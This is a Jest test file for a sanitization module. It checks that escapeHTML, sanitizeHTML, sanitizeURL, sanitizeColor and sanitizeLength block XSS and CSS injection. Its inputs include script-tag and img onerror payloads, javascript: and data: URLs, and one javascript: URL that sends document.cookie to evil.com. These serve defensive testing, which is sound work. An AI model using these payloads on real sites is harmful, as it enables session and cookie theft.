/**
 * Security Sanitization Tests
 * Tests for XSS prevention in HTML generation
 */

import {
  escapeHTML,
  sanitizeHTML,
  sanitizeURL,
  sanitizeColor,
  sanitizeLength,
} from '../sanitization'

describe('Security Sanitization', () => {
  describe('escapeHTML', () => {
    test('escapes basic HTML tags', () => {
      const malicious = '<script>alert("xss")</script>'
      const result = escapeHTML(malicious)
      expect(result).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;')
    })

    test('escapes HTML entities', () => {
      const input = '& < > " \''
      const result = escapeHTML(input)
      expect(result).toBe('&amp; &lt; &gt; &quot; &#039;')
    })

    test('handles empty strings', () => {
      expect(escapeHTML('')).toBe('')
    })
  })

  describe('sanitizeHTML', () => {
    test('allows safe formatting tags', () => {
      const input = '<strong>Bold</strong> <em>Italic</em>'
      const result = sanitizeHTML(input)
      expect(result).toContain('<strong>Bold</strong>')
      expect(result).toContain('<em>Italic</em>')
    })

    test('blocks script tags', () => {
      const malicious = '<strong>Bold</strong> <script>alert("xss")</script>'
      const result = sanitizeHTML(malicious)
      expect(result).toContain('<strong>Bold</strong>')
      expect(result).not.toContain('script')
      expect(result).not.toContain('alert')
    })

    test('blocks img onerror attacks', () => {
      const malicious = '<img src=x onerror=alert(1)>'
      const result = sanitizeHTML(malicious)
      expect(result).not.toContain('onerror')
    })

    test('allows safe links', () => {
      const input = '<a href="https://example.com">Link</a>'
      const result = sanitizeHTML(input)
      expect(result).toContain('href')
      expect(result).toContain('https://example.com')
    })
  })

  describe('sanitizeURL', () => {
    test('allows https URLs', () => {
      const url = 'https://example.com'
      expect(sanitizeURL(url)).toBe(url)
    })

    test('allows http URLs', () => {
      const url = 'http://example.com'
      expect(sanitizeURL(url)).toBe(url)
    })

    test('allows mailto URLs', () => {
      const url = 'mailto:test@example.com'
      expect(sanitizeURL(url)).toBe(url)
    })

    test('blocks javascript: protocol', () => {
      const malicious = 'javascript:alert(document.cookie)'
      expect(sanitizeURL(malicious)).toBe('#')
    })

    test('blocks data: protocol', () => {
      const malicious = 'data:text/html,<script>alert(1)</script>'
      expect(sanitizeURL(malicious)).toBe('#')
    })

    test('allows relative URLs starting with /', () => {
      expect(sanitizeURL('/path/to/page')).toBe('/path/to/page')
    })

    test('allows anchor links', () => {
      expect(sanitizeURL('#section')).toBe('#section')
    })

    test('handles empty or invalid URLs', () => {
      expect(sanitizeURL('')).toBe('#')
      expect(sanitizeURL('not a url')).toBe('#')
    })
  })

  describe('sanitizeColor', () => {
    test('allows valid hex colors', () => {
      expect(sanitizeColor('#ff0000')).toBe('#ff0000')
      expect(sanitizeColor('#f00')).toBe('#f00')
    })

    test('allows RGB colors', () => {
      expect(sanitizeColor('rgb(255, 0, 0)')).toBe('rgb(255, 0, 0)')
    })

    test('allows RGBA colors', () => {
      expect(sanitizeColor('rgba(255, 0, 0, 0.5)')).toBe('rgba(255, 0, 0, 0.5)')
    })

    test('allows named colors', () => {
      expect(sanitizeColor('red')).toBe('red')
      expect(sanitizeColor('blue')).toBe('blue')
    })

    test('blocks CSS injection attempts', () => {
      const malicious = 'red; position:fixed; z-index:999999;'
      expect(sanitizeColor(malicious)).toBe(null)
    })

    test('handles invalid colors', () => {
      expect(sanitizeColor('notacolor')).toBe(null)
      expect(sanitizeColor('')).toBe(null)
    })
  })

  describe('sanitizeLength', () => {
    test('allows valid pixel values', () => {
      expect(sanitizeLength('16px')).toBe('16px')
      expect(sanitizeLength('100px')).toBe('100px')
    })

    test('allows em/rem values', () => {
      expect(sanitizeLength('1.5em')).toBe('1.5em')
      expect(sanitizeLength('2rem')).toBe('2rem')
    })

    test('allows percentage values', () => {
      expect(sanitizeLength('50%')).toBe('50%')
    })

    test('allows zero without unit', () => {
      expect(sanitizeLength('0')).toBe('0')
    })

    test('blocks CSS injection attempts', () => {
      const malicious = '16px; position:fixed;'
      expect(sanitizeLength(malicious)).toBe(null)
    })

    test('handles invalid lengths', () => {
      expect(sanitizeLength('invalid')).toBe(null)
      expect(sanitizeLength('')).toBe(null)
    })
  })
})

// Integration test: Ensure malicious content doesn't make it through
describe('Integration: XSS Prevention', () => {
  test('complete XSS attack is blocked', () => {
    const maliciousText = '<img src=x onerror=alert(document.cookie)>'
    const result = sanitizeHTML(maliciousText)

    // Should not contain dangerous attributes
    expect(result).not.toContain('onerror')
    expect(result).not.toContain('alert')
    expect(result).not.toContain('document.cookie')
  })

  test('javascript URL injection is blocked', () => {
    const maliciousUrl = 'javascript:void(document.location="http://evil.com/"+document.cookie)'
    const result = sanitizeURL(maliciousUrl)

    expect(result).toBe('#')
  })

  test('CSS injection is blocked', () => {
    const maliciousColor = '#ff0000; } body { display: none; } .fake {'
    const result = sanitizeColor(maliciousColor)

    expect(result).toBe(null)
  })
})
